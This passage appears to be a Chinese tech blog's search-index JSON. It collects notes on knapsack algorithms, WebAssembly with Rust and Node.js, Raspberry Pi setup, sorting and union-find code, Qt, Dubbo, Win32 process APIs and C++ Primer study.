1][j]小于0，说明前i-1种凑不出来j。加上第i个硬币可能面值太大，也可能正好，所以先取 -1待定。 f[i][j + cost[i]] = std::cmp::max(f[i][j + cost[i]], f[i][j] - 1); 如果能凑成j+cost[i],那么就把硬币数量-1，如果不行，就维持-1的状态。 然后把二维数组改为一位数组。 混合背包 就是上面三种背包混合在一起 //伪代码： foriin0..n{ifi是01背包{zero_one_pack(..);}elseifi是完全背包{complete_pack(..);}elseifi是多重背包{multiple_pack(..);}} 男人八题之多重背包问题 二维背包 对于每件物品，具有两种不同的费用，选择这件物品必须同时付出这两种费用。对于每种费用都有一个可付出的最大值（背包容量）。问怎样 选择物品可以得到最大的价值。 设第 i 件物品所需的两种费用分别为 Ci 和 Di。两种费用可付出的最大值（也即两种背包容量）分别为 V 和 U。物品的价值为 Wi 状态转移方程如下： F[i, v, u] = max{F[i − 1, v, u], F[i − 1, v − Ci, u − Di] +Wi} 有时，“二维费用”的条件是以这样一种隐含的方式给出的：最多只能取 U 件物品。 这事实上相当于每件物品多了一种“件数”的费用，每个物品的件数费用均为 1，可以 付出的最大件数费用为 U 分组背包 有 N 件物品和一个容量为 V 的背包。第 i 件物品的费用是 Ci，价值是 Wi。这些物品被划分为 K 组，每组中的物品互相冲突，最多选一件。求解将哪些物品装入背包 可使这些物品的费用总和不超过背包容量，且价值总和最大 设 F[k, v] 表示前 k 组物品花费费用 v 能取得的最大权值，则有： F[k, v] = max{F[k − 1, v], F[k − 1, v − Ci] + Wi | item i ∈ group k} fn group_pack(f: \u0026mutVec\u003cusize\u003e,v: usize,cost: \u0026Vec\u003cusize\u003e,value: \u0026Vec\u003cusize\u003e){letgroup=cost.len();forjin(0..=v).rev(){forkin0..group{ifj\u003ccost[k]{break;}f[j]=cmp::max(f[j],f[j-cost[k]]+value[k]);}}}fn test_group(){letv=4;letn=3;letcost=vec![vec![1,2],vec![3,4],vec![5,6]];//三组 letvalue=vec![vec![3,2],vec![1,5],vec![2,4]];// letmutf=vec![0;v+1];foriin0..n{group_pack(\u0026mutf,v,\u0026cost[i],\u0026value[i]);}dbg!(\u0026f[v]);} 有依赖的背包问题 也就是说，物品 i 依赖于物品 j，表示若选物品 i，则必须选物品 j。 可以对主件 k 的“附件集合”先进行一次 01 背包，得到费用依次为 0. . .V − Ck 所有这些值时相应的最 大价值 Fk[0 . . . V − Ck]。那么，这个主件及它的附件集合相当于 V − Ck + 1 个物品的 物品组，其中费用为 v 的物品的价值为 Fk[v −Ck] +Wk，v 的取值范围是 Ck ≤ v ≤ V。 也就是说，原来指数级的策略中，有很多策略都是冗余的，通过一次 01 背包后，将主件 k 及其附件转化为 V −Ck + 1 个物品的物品组，就可以直接应用分组背包的算法解决问题了 背包问题总结（下） /* 即物品间存在依赖，比如i依赖于j，表示若选物品i，则必须选物品j http://acm.hdu.edu.cn/showproblem.php?pid=3449 有很多个箱子，想买箱子中的物品必须先买下箱子，典型的依赖背包 将不依赖其他物品的物品称为主件，依赖其他物品的物品称为附件 我们有n个箱子，箱子里面的物品个数为cnt[i] 那么箱子称为主件，箱子里面的物品称为附件 那么考虑一个主件和它附件的集合，那么有2^n+1种策略，每种策略都是互斥的。所以它是分组背包问题。 但是不能像一般的分组背包那样处理，因为组内有2^n+1种。 但是考虑到费用相同时，只选择价值最大的。所以可以对组内的附件进行01背包，得到费用依次为v-c[i]...0的最大价值 dp2[v-c[i]...0] */ #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int dp[100000+10],dp2[100000+10]; int box[55],cnt[55],price[55][11],value[55][11]; inline int max(const int \u0026a, const int \u0026b) { return a \u003c b ? b : a; } int main() { int n,v,i,j,k; while(scanf(\"%d%d\",\u0026n,\u0026v)!=EOF) { memset(dp,0,sizeof(dp)); for(i=1; i\u003c=n; ++i) { scanf(\"%d%d\",\u0026box[i],\u0026cnt[i]); memcpy(dp2,dp,sizeof(dp)); for(j=1; j\u003c=cnt[i]; ++j) { scanf(\"%d%d\",\u0026price[i][j],\u0026value[i][j]); for(k=v-box[i]; k\u003e=price[i][j]; --k)//附件进行01背包，每个dp2[k]对于组内的一种策略 dp2[k] = max(dp2[k],dp2[k-price[i][j]]+value[i][j]); } for(k=box[i];k\u003c=v; ++k) dp[k] = max(dp[k],dp2[k-box[i]]);//当容量为k时，取第i组的物品时得到的最大值和不取比较哪个大 } printf(\"%d\\n\",dp[v]); } return 0; } ","date":"2020-08-10","objectID":"/2020/08/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/:0:2","tags":["算法","背包问题"],"title":"背包问题","uri":"/2020/08/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/"},{"categories":null,"content":"SSVM 简介 SSVM 是适用于云，AI 和区块链应用程序的高性能，企业级 WebAssembly（WASM）虚拟机。包括以下用例： Node.js 应用程序中 Rust 函数的高性能和安全运行时 针对 ONNX AI 模型的硬件优化的运行时 适用于领先的区块链平台的智能合约运行时引擎 一个简单的 Web App 功能：base64 的编码和解码 ","date":"2020-08-01","objectID":"/2020/08/webassembly/:0:0","tags":["wasm","Rust"],"title":"WebAssembly","uri":"/2020/08/webassembly/"},{"categories":null,"content":"首先在 rust 的 lib 文件中编写实际的用来编码和解码的代码： usebase64::{decode,encode};usewasm_bindgen::prelude::*;#[wasm_bindgen]pubfn base64Encode(s: \u0026str)-\u003e String {encode(s)}#[wasm_bindgen]pubfn base64Decode(s: \u0026str)-\u003e String {String::from_utf8(decode(s).unwrap()).unwrap()} ","date":"2020-08-01","objectID":"/2020/08/webassembly/:0:1","tags":["wasm","Rust"],"title":"WebAssembly","uri":"/2020/08/webassembly/"},{"categories":null,"content":"然后在 node 中调用 rust 代码： const { base64Encode, base64Decode, } = require('../pkg/ssvm_nodejs_starter_lib.js') const http = require('http') const url = require('url') const hostname = '0.0.0.0' const port = 3000 const server = http.createServer((req, res) =\u003e { const queryObject = url.parse(req.url, true).query if (queryObject['encodeStr']) { res.end(base64Encode(queryObject['encodeStr']) + '\\n') } else if (queryObject['decodeStr']) { console.log(queryObject['decodeStr']) res.end(base64Decode(queryObject['decodeStr']) + '\\n') } else { res.end( `Please use command curl http://${hostname}:${port}/?encodeStr=string or http://${hostname}:${port}/?decodeStr=string \\n` ) } }) server.listen(port, hostname, () =\u003e { console.log(`Server running at http://${hostname}:${port}/`) }) ","date":"2020-08-01","objectID":"/2020/08/webassembly/:0:2","tags":["wasm","Rust"],"title":"WebAssembly","uri":"/2020/08/webassembly/"},{"categories":null,"content":" 1.添加 wpa_supplicant.conf 文件 在 boot 分区下添加 wpa_supplicant.conf 文件，文件内容写入 country=CN ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev network={ ssid=\"my_wifi\" psk=\"12345678\" key_mgmt=WPA-PSK } 2.开启 ssh 在 boot 分区下新建 ssh 文件，无内容 3.插卡，启动 启动后树莓会自动链接 wifi，但是有个问题，不知道树莓的自动获取的 ip 方法 1： 如果网络中只有一个 pi，可以直接 ping raspberrypi 方法 2： nmap -sn 192.168.1.0/24 方法 3： 打开路由，看看已连接设备，叫 raspberrypi 的就是 默认用户名：pi 默认密码：raspberry ","date":"2020-07-31","objectID":"/2020/07/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%AC%94%E8%AE%B0/:0:0","tags":["树莓派"],"title":"树莓派笔记","uri":"/2020/07/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"图 ","date":"2020-07-19","objectID":"/2020/07/%E7%AE%97%E6%B3%95/:1:0","tags":["算法"],"title":"算法","uri":"/2020/07/%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"无向图 图的表示方法：邻接表 dfs 和 bfs 的区别：dfs 是用栈，bfs 用队列 //连通图 public class CC { private boolean[] marked; private int[] id; private int count; public CC(Graph G) { marked = new boolean[G.V()]; id = new int[G.V()]; for (int s = 0; s \u003c G.V(); s++) { dfs(G, s); count++; } } private void dfs(Graph G, int v) { marked[v] = true; id[v] = count; for (int w : G.adj(v)) if (!marked[w]) dfs(G, w); } } ","date":"2020-07-19","objectID":"/2020/07/%E7%AE%97%E6%B3%95/:1:1","tags":["算法"],"title":"算法","uri":"/2020/07/%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"有向图 有向无环图(DAG): 不含有向环的有向图 当且仅当一副有向图是无环图时它才能进行拓扑排序 有向图中基于 dfs 的顶点排序：前序、后续、逆后续 前序和后续用队列，逆后续用栈 一副有向无环图的拓扑排序就是所有顶点的逆后续排列（要先判断有没有环） 强连通 ：两个顶点互联可达，则这两个顶点是强连通。若一个图任意两顶点都是强连通，则这幅有向图也是强连通的。 计算强连通分量的 Kosaraju 算法：先使用 dfs 查找 G 的反向图，得到所有顶点的逆后续，再用 dfs 处理，即可得到强连通分量 //强连通分量 public class KosarajuSCC { private boolean[] marked; private int[] id; private int count; public KosarajuSCC(Digraph G) { marked = new boolean[G.V()]; id = new int[G.V()]; DepthFirstOrder order=new DepthFirstOrder(G.reverse()); for (int s:order.reversePost()) { dfs(G, s); count++; } } private void dfs(Digraph G, int v) { marked[v] = true; id[v] = count; for (int w : G.adj(v)) if (!marked[w]) dfs(G, w); } } ","date":"2020-07-19","objectID":"/2020/07/%E7%AE%97%E6%B3%95/:1:2","tags":["算法"],"title":"算法","uri":"/2020/07/%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"排序 ","date":"2020-07-19","objectID":"/2020/07/%E7%AE%97%E6%B3%95/:2:0","tags":["算法"],"title":"算法","uri":"/2020/07/%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"插入排序 fn insert\u003cT: Ord +Copy\u003e(a: \u0026mut[T]){foriin1..a.len(){lettmp=a[i];letmutj=i;whilej\u003e0\u0026\u0026tmp\u003ca[j-1]{a[j]=a[j-1];j-=1;}a[j]=tmp;}} ","date":"2020-07-19","objectID":"/2020/07/%E7%AE%97%E6%B3%95/:2:1","tags":["算法"],"title":"算法","uri":"/2020/07/%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"希尔排序 fn shell\u003cT: Ord +Copy\u003e(a: \u0026mut[T]){letn=a.len();letmuth=1;whileh\u003cn/3{h=h*3+1;}whileh\u003e=1{foriinh..n{lettmp=a[i];letmutj=i;whiletmp\u003ca[j-h]{a[j]=a[j-h];j-=h;ifletNone=j.checked_sub(h){break;}}a[j]=tmp;}h/=3;}} ","date":"2020-07-19","objectID":"/2020/07/%E7%AE%97%E6%B3%95/:2:2","tags":["算法"],"title":"算法","uri":"/2020/07/%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"归并排序 //原地归并 fn merge_help\u003cT: Ord +Copy\u003e(a: \u0026mut[T],lo: usize,mid: usize,hi: usize){ifa[mid]\u003c=a[mid+1]{return;}letmuttmp=a.to_owned();//tmp.copy_from_slice(a); letmuti=lo;letmutj=mid+1;forkinlo..=hi{ifi\u003emid{a[k]=tmp[j];j+=1;}elseifj\u003ehi{a[k]=tmp[i];i+=1;}elseiftmp[j]\u003ctmp[i]{a[k]=tmp[j];j+=1;}else{a[k]=tmp[i];i+=1;}}}//自顶向下的归并排序 fn merge_sort\u003cT: Ord +Copy\u003e(a: \u0026mut[T],lo: usize,hi: usize){ifhi\u003c=lo{return;}//数组较小时用插入排序更快 ifhi-lo\u003c15{insert(\u0026muta[lo..=hi])}letmid=(lo+hi)/2;merge_sort(a,lo,mid);merge_sort(a,mid+1,hi);merge_help(a,lo,mid,hi);}fn merge\u003cT: Ord +Copy\u003e(a: \u0026mut[T]){merge_sort(a,0,a.len()-1);}//自底向上的归并 fn merge_sort_bu\u003cT: Ord +Copy\u003e(a: \u0026mut[T],lo: usize,hi: usize){letn=a.len();letmutsz=1;whilesz\u003cn{letmutlo=0;whilelo\u003cn-sz{merge_help(a,lo,lo+sz-1,std::cmp::min(lo+sz+sz-1,n-1));lo+=2*sz;}sz*=2;}} ","date":"2020-07-19","objectID":"/2020/07/%E7%AE%97%E6%B3%95/:2:3","tags":["算法"],"title":"算法","uri":"/2020/07/%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"堆排序 #[derive(Debug)]struct MaxPQ\u003cT: Ord +Copy\u003e{pq: Vec\u003cT\u003e,}impl\u003cT: Ord +Copy+std::fmt::Debug\u003eMaxPQ\u003cT\u003e{fn new(zero: T)-\u003e Self{letpq=vec![zero];Self{pq}}fn is_empty(\u0026self)-\u003e bool {self.pq.len()\u003c=1}fn insert(\u0026mutself,v: T){self.pq.push(v);letn=self.pq.len()-1;self.swim(n);}fn swim(\u0026mutself,mutk: usize){whilek\u003e1\u0026\u0026self.pq[k]\u003eself.pq[k/2]{self.pq.swap(k/2,k);k/=2;}}fn sink(\u0026mutself,mutk: usize,N: usize){lettmp=self.pq[k];whilek*2\u003c=N{letmutj=k*2;ifj\u003cN\u0026\u0026self.pq[j]\u003cself.pq[j+1]{j+=1;}ifself.pq[k]\u003e=self.pq[j]{break;}self.pq[k]=self.pq[j];k=j;}self.pq[k]=tmp;}fn sort(a: \u0026mut[T])-\u003e Vec\u003cT\u003e{letmutn=a.len();letmutpq=MaxPQ::new(a[0]);pq.pq.append(\u0026muta.to_vec());forkin(1..=(n/2)).rev(){MaxPQ::sink(\u0026mutpq,k,n);}whilen\u003e1{pq.pq.swap(1,n);n-=1;MaxPQ::sink(\u0026mutpq,1,n);}pq.pq.remove(0);pq.pq}} Api： public class UF{ UF(int N);//初始化N个触点 void union(int p,int q) //在p和q之间添加一条连接 int find(int p) // p所在的分量的标识符 boolean connected(intp ,int q)//如果q和p在同一各分量中则返回true int count()//联通分量的数量 } ","date":"2020-07-19","objectID":"/2020/07/%E7%AE%97%E6%B3%95/:2:4","tags":["算法"],"title":"算法","uri":"/2020/07/%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"快速排序 fn quick_sort(a:\u0026[i32],lo:i32,hi:i32){} voidgetNext(char*p,int*next){//next.length=p.length next[0]=-1;inti=0,j=-1;while(i\u003cstrlen(p)-1){if(j==-1||p[i]==p[j]){++i;++j;//next[i] = j; //下面是优化 if(p[i]!=p[j])next[i]=j;elsenext[i]=next[j];}elsej=next[j];}}intKMP(char*t,char*p){inti=0;intj=0;while(i\u003cstrlen(t)\u0026\u0026j\u003c(int)strlen(p)){if(j==-1||t[i]==p[j]){i++;j++;}elsej=next[j];}if(j==strlen(p))returni-j;elsereturn-1;} ","date":"2020-07-19","objectID":"/2020/07/%E7%AE%97%E6%B3%95/:2:5","tags":["算法"],"title":"算法","uri":"/2020/07/%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"加权 quick-union 算法： 将小数的根节点连接到大树的根节点 public class WeightedQuickUnionUF{ private int[] id; private int[] sz; private int count; public WeightedQuickUnionUF(int N) { count = N; id = new int[N]; for (int i = 0; i \u003c N; i++) id[i] = i; sz = new int[N]; for (int i = 0; i \u003c N; i++) sz[i] = 1; } public int getCount() { return count; } public boolean connected(int p, int q) { return find(p) == find(q); } public int find(int p) { while (p != id[p]) p = id[p]; return p; } public void union(int p, int q) { int i = find(p); int j = find(q); if (i == j) return; if (sz[i] \u003c sz[j]) { id[i] = j; sz[j] += sz[i]; } else { id[j] = i; sz[i] += sz[j]; } count--; } } ","date":"2020-07-19","objectID":"/2020/07/%E7%AE%97%E6%B3%95/:3:0","tags":["算法"],"title":"算法","uri":"/2020/07/%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"最优解法：路径压缩的加权 quick-union 算法 要实现路径压缩，只需要为find()添加一个循环，将在路径上遇到的所有节点都直接链接到根节点。 public int find(int p) { int root = p; while (root != id[root]) root = id[root]; while (p!=root) { int next = id[p]; id[p] = root; p = next; } return root; } ","date":"2020-07-19","objectID":"/2020/07/%E7%AE%97%E6%B3%95/:4:0","tags":["算法"],"title":"算法","uri":"/2020/07/%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"BM 算法原理 字符串匹配 —- BM 算法原理 ","date":"2020-07-19","objectID":"/2020/07/%E7%AE%97%E6%B3%95/:5:0","tags":["算法"],"title":"算法","uri":"/2020/07/%E7%AE%97%E6%B3%95/"},{"categories":null,"content":"Qt 快速入门系列教程 Qt 如果用 cmake 构建的话，默认是没有 UNICODE 预定义的，也就是说调用的 win32 api 都是 A 版的，而不是 W 版，解决方法是在 CMakeLists.txt 中加入 add_definitions(-DUNICODE -D_UNICODE) ","date":"2020-07-09","objectID":"/2020/07/qt%E7%AC%94%E8%AE%B0/:0:0","tags":["c++","Qt"],"title":"Qt笔记","uri":"/2020/07/qt%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"设置透明而空间不透明 this-\u003esetWindowFlags(Qt::FramelessWindowHint); this-\u003esetWindowOpacity(1); this-\u003esetAttribute(Qt::WA_TranslucentBackground); ","date":"2020-07-09","objectID":"/2020/07/qt%E7%AC%94%E8%AE%B0/:0:1","tags":["c++","Qt"],"title":"Qt笔记","uri":"/2020/07/qt%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"关于常用 setWindowFlags 的状态设置： Qt::FramelessWindowHint 窗口无边框 Qt::WindowStaysOnTopHint 窗口置顶 Qt::WindowMaximized 窗口启动最大化 Qt::SubWindow 表示窗口小部件是子窗口 ","date":"2020-07-09","objectID":"/2020/07/qt%E7%AC%94%E8%AE%B0/:0:2","tags":["c++","Qt"],"title":"Qt笔记","uri":"/2020/07/qt%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"Dubbo 的功能除了基本的 RPC 职能外，核心功能便是监控及服务注册。 ","date":"2020-06-28","objectID":"/2020/06/dubbo%E5%85%A5%E9%97%A8/:0:0","tags":["微服务"],"title":"Dubbo入门","uri":"/2020/06/dubbo%E5%85%A5%E9%97%A8/"},{"categories":null,"content":"provider 服务 首先创建一个 maven 工程：springboot-provider，再添加一个 moven 模块：sample-api，再里面创建一个接口：IHelloService public interface IHelloService { String sayHello(String name); } 然后mvn install springboot-provide这个顶层项目，这会在本地的 maven 仓库安装这父子两个库。 再添加一个 springboot 模块：sample-provider，来实现IHelloService接口 @DubboService public class HelloServiceImpl implements IHelloService { @Value(\"${dubbo.application.name}\") private String serviceName; @Override public String sayHello(String s) { return String.format(\"[%s]: Hello,%s\", serviceName, s); } } 在 pom.xml 添加依赖 \u003cdependency\u003e \u003cgroupId\u003eorg.apache.dubbo\u003c/groupId\u003e \u003cartifactId\u003edubbo-spring-boot-starter\u003c/artifactId\u003e \u003cversion\u003e2.7.7\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.example\u003c/groupId\u003e \u003cartifactId\u003esample-api\u003c/artifactId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003c/dependency\u003e 在 application.properties 添加 dubbo 的配置 dubbo.application.name=jesse-dubbo dubbo.protocol.port=20880 dubbo.protocol.name=dubbo dubbo.registry.address=N/A 启动类： @DubboComponentScan @SpringBootApplication public class SampleProviderApplication { public static void main(String[] args) { SpringApplication.run(SampleProviderApplication.class, args); } } provider 服务就启动了~ ","date":"2020-06-28","objectID":"/2020/06/dubbo%E5%85%A5%E9%97%A8/:1:0","tags":["微服务"],"title":"Dubbo入门","uri":"/2020/06/dubbo%E5%85%A5%E9%97%A8/"},{"categories":null,"content":"consumer 服务 新建一个 springboot 项目：springboot-consumer，在 pom.xml 添加依赖，同上。同样也要在 application.properties 添加 dubbo 的配置，不过最少只要配置 name 就行 dubbo.application.name=springboot-consumer 启动类： @SpringBootApplication public class SpringbootConsumerApplication { @DubboReference(url = \"dubbo://127.0.0.1:20880\") private IHelloService helloService; public static void main(String[] args) { SpringApplication.run(SpringbootConsumerApplication.class, args); } @Bean public ApplicationRunner runner(){ return args -\u003e System.out.println(helloService.sayHello(\"Mic\")); } } 完~ ","date":"2020-06-28","objectID":"/2020/06/dubbo%E5%85%A5%E9%97%A8/:2:0","tags":["微服务"],"title":"Dubbo入门","uri":"/2020/06/dubbo%E5%85%A5%E9%97%A8/"},{"categories":null,"content":"win32 根据进程名获取进程 ID 或者终止进程： https://blog.csdn.net/zjx_cfbx/article/details/82390064 https://blog.csdn.net/ouchengguo/article/details/88602267 https://blog.csdn.net/zwhuang/article/details/2218651 https://www.write-bug.com/article/1568.html ","date":"2020-03-15","objectID":"/2020/03/win32/:0:0","tags":["win32"],"title":"Win32","uri":"/2020/03/win32/"},{"categories":null,"content":"从窗口句柄获取进程句柄 FindWindow：找串口句柄 GetWindowThreadProcessId：由窗口句柄找进程 id OpenProcess：由进程 id 得进程句柄 ","date":"2020-03-15","objectID":"/2020/03/win32/:0:1","tags":["win32"],"title":"Win32","uri":"/2020/03/win32/"},{"categories":null,"content":"内存读写 ReadProcessMemory WriteProcessMemory ","date":"2020-03-15","objectID":"/2020/03/win32/:0:2","tags":["win32"],"title":"Win32","uri":"/2020/03/win32/"},{"categories":null,"content":"通过快照来获取进程 ID HANDLE WINAPI CreateToolhelp32Snapshot(DWORD dwFlags,DWORD th32ProcessID); BOOL WINAPI Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe); BOOL WINAPI Process32Next(HANDLE hSnapshot,LPPROCESSENTRY32 lppe); //结果 typedef struct tagPROCESSENTRY32 { DWORD dwSize; // 结构大小； DWORD cntUsage; // 此进程的引用计数； DWORD th32ProcessID; // 进程ID; DWORD th32DefaultHeapID; // 进程默认堆ID； DWORD th32ModuleID; // 进程模块ID； DWORD cntThreads; // 此进程开启的线程计数； DWORD th32ParentProcessID; // 父进程ID； LONG pcPriClassBase; // 线程优先权； DWORD dwFlags; // 保留； char szExeFile[MAX_PATH]; // 进程全名； } PROCESSENTRY32; x64-dbg 使用： https://www.bilibili.com/s/video/BV1jK4y1b7wc cs source:控制台（~） sv_cheats 1 bot_add_t bot_stop 1 bot_stop 0 ","date":"2020-03-15","objectID":"/2020/03/win32/:0:3","tags":["win32"],"title":"Win32","uri":"/2020/03/win32/"},{"categories":null,"content":"设置滚动条： SetScrollInfo GetScrollInfo 滚动条变化了调用 ScrollWindows,再调用 UpdateWindow ","date":"2020-03-15","objectID":"/2020/03/win32/:0:4","tags":["win32"],"title":"Win32","uri":"/2020/03/win32/"},{"categories":null,"content":"DC 三种获取方法与销毁方法（要成对出现） GetDC()——ReleaseDC() GeginPaint()——EndPaint() GetCompatibleDC()——DeleteDC() ","date":"2020-03-15","objectID":"/2020/03/win32/:0:5","tags":["win32"],"title":"Win32","uri":"/2020/03/win32/"},{"categories":null,"content":"为防止头文件被多次引用，采用 #ifndef xxx #define xxx ... #endif xxx可以根据头文件名字来定义一个唯一的名字。 int global=1000;//可以在别的文件用extern引用 static int one_file=50;//只能在本文件用 const int f=10;//等于 static const int f=10;其他文件不能用 extern const int g=10;//其他文件可以用 void fun1(){ static int c=0;//静态，只能在本函数内用 } 以上代码表示 static 有 2 种意义： 1.用于局部声明，表示变量是静态变量。 2.用于代码块外声明，表示内部链接性，而变量已经是静态了。 未被初始化的静态变量所有位都被设置为 0，成为零初始化。 constexpr：创建常亮表达式 变量声明： 定义声明，会开辟空间 double up; extern char gz=‘z’; //因为有初始化所以也是定义声明 引用声明，不会开辟空间 extern int b; 函数的链接性默认为外部的，即其他文件可以用（用 extern 或者不用）,用 static 设置为内部的。 ","date":"2020-02-11","objectID":"/2020/02/c-%E7%AC%94%E8%AE%B0/:0:0","tags":["c++"],"title":"C++笔记","uri":"/2020/02/c-%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"语言链接性 在 c 语言中，如spiff这样的函数名翻译成_spiff，这称为 c 语言链接性，而 c++也有 c++的语言链接性，和 C 不同。 extern \"C\" void spiff(int); //用C的语言链接性查找函数 extern void spoff(int); //默认就是C++语言链接性查找函数 extern \"C++\" void spaff(int);//或显式 ","date":"2020-02-11","objectID":"/2020/02/c-%E7%AC%94%E8%AE%B0/:1:0","tags":["c++"],"title":"C++笔记","uri":"/2020/02/c-%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"命名空间 用户命名空间: namespace Jack{ double p; void f(); } 可以把名称加入到已有的名称空间中。 访问： Jack::f(); 或者 using Jack::f; f() 或者 using namespace Jack; f(); struct 默认是 public 的，class 默认是 private 的。 Stock s1=Stock(\"aa\",11);//初始化，可能会创建临时对象（也可能不会） Stock s2(\"aa\",1);//同上 s2=Stock(\"b\",11);//赋值，一定会创建一个临时变量 Stock s3={\"cc\",11};//列表初始化 Stock s4{\"cc\",11}; const 成员函数：void Stock::show() const，只要类方法不修改对象，就应该 声明为 const 接受一个参数的构造函数允许用赋值语法将对象初始化为一个值: Classname obj=value; ","date":"2020-02-11","objectID":"/2020/02/c-%E7%AC%94%E8%AE%B0/:2:0","tags":["c++"],"title":"C++笔记","uri":"/2020/02/c-%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"两种类型转换： Stock(double d);//会将double隐式转换成Stock Stock(double d,int a=0);//第二个提供默认值也会隐式转化 explicit Stock(double d);//会关闭隐式转化 上面是将数字转化成类对象 下面是将类对象转化成数字，叫做转换函数 operator double();//转换成double explicit operator double();//同样，需要显示类型转换才会转换，如(double) xx; c++会默认提供下面成员函数： 默认构造函数 默认析构函数 复制构造函数 Class_name(const Class_name \u0026); Class StringBad{}; StringBad d(m); StringBad d=m; StringBad d=StringBad(m); StringBad *p=new StringBad(m); 其中中间 2 种可能生成中间匿名对象，最后一种一定生成中间匿名对象 赋值运算符 地址运算符 StringBad a(\"aa\"); Stringbad b; b=a;//会调用赋值运算符 StringBad c=a;//会调用复制构造函数，不一定调用赋值运算符 对 const 数据成员，和引用类成员，初始化必须用初始化列表来初始化。 对于简单数据类型成员，使用初始化列表和在函数体内赋值没什么区别，但对于本身就是类对象的成员来时使用初始化列表效率更高。 右值引用 如int \u0026\u0026 r=13;，int \u0026\u0026 r = x+y，传统的左值引用只能出现在=的左边，现在的右值引用如常量是出现在=的右边。右值引用的目的之一是实现移动语义。 ","date":"2020-02-11","objectID":"/2020/02/c-%E7%AC%94%E8%AE%B0/:2:1","tags":["c++"],"title":"C++笔记","uri":"/2020/02/c-%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"移动语义 移动语义实际上避免的移动原始数据，而只是修改了记录。 使用std::move()一般会导致移动操作，但并非一定会 如果您提供了析构函数、复制构造函数或 复制赋值运算符，编译器将不会自动提供移动构造函数和移动赋值运算符； 如果您 提供了移动构造函数或移动赋值运算符，编译器将不会自动提供默认构造函数，复制构造函数和复制赋值运算符。 使用关键字 default 显式地声明这些方法的默认版本 关键字 delete 可用于禁止编译器使用特定方法 关键字 default 只能用于 6 个特殊成员函数，但 delete 可用于任何成员函数。 delete 的一种可能用法是禁止特定的转换。 在一个构造函数的定义中使用另一个构造函数，这被称为委托。 c++ primer 读书笔记 ","date":"2020-02-11","objectID":"/2020/02/c-%E7%AC%94%E8%AE%B0/:2:2","tags":["c++"],"title":"C++笔记","uri":"/2020/02/c-%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"2.基本内置类型 带符号数与无符号数操作时，会变成无符号数。如，-1 会变成 255 定义于函数体内的内置类型的对象如果没有初始化，则其值未定义。在函数体外默认是 0。类的对象如果没有显示初始化，其值由类确定。 const int *p=nullptr;//p是一个指向整形常量的指针 constexpr int *q=nullptr;//q是一个指向整形的常量指针 typedef char *ps; const ps cstr=0;//常量指针 const ps *p;//指向常量指针 //不能把别名带入理解，是错误的 auto 会忽略顶层 const，底层 const 会保留。auto 赋值等号右边是一个引用时，auto 类型是没有引用的。 decltype 返回操作数的数据类型。如果表达式是一个变量，会返回变量的类型（包括 const 和引用）,如果表达式内容是解引用操作，会得到引用类型；如果是加了括号的表达式，会得到引用 ","date":"2020-02-11","objectID":"/2020/02/c-%E7%AC%94%E8%AE%B0/:3:0","tags":["c++"],"title":"C++笔记","uri":"/2020/02/c-%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"3.字符串、向量和数组 不能把字面值直接相加 使用数组作为一个 auto 变量的初始值时，推断得到的类型是指针而非数组 用 for 语句处理多维数组时，除了最内层的循环外，其他所有的控制变量都应该是引用类型 ","date":"2020-02-11","objectID":"/2020/02/c-%E7%AC%94%E8%AE%B0/:4:0","tags":["c++"],"title":"C++笔记","uri":"/2020/02/c-%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"4.表达式 static_cast:只要不包含底层 const，都可以用来类型转化 const_cast: 只能改变对象的底层 const 性质（去掉或增加） reinterpret_cast:强制转化，很危险 ","date":"2020-02-11","objectID":"/2020/02/c-%E7%AC%94%E8%AE%B0/:5:0","tags":["c++"],"title":"C++笔记","uri":"/2020/02/c-%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"6.函数 当用实参初始化形参时会忽略掉顶层 const。形参的顶级 const 被忽略了。而底层 const 不会被忽略。 如果形参数量未知，但类型相同，可以用标准库的initializer_list类型的形参，这是一个模板类型。 调用一个返回引用的函数得到左值，其他类型得到右值。如果返回类型是常量引用，则不能给结果赋值。 ","date":"2020-02-11","objectID":"/2020/02/c-%E7%AC%94%E8%AE%B0/:6:0","tags":["c++"],"title":"C++笔记","uri":"/2020/02/c-%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"安装 fcitx5 yay -S fcitx5-im ","date":"2020-01-10","objectID":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/:1:0","tags":["Manjaro"],"title":"fcitx5安装","uri":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"安装输入法 输入法可以选 rime,也可以选 fcitx5-chinese-addons 如果要用小鹤双拼，rime 要下载配置文件，而后者不需要 yay -S fcitx5-chinese-addons #yay -S fcitx5-rime //rime 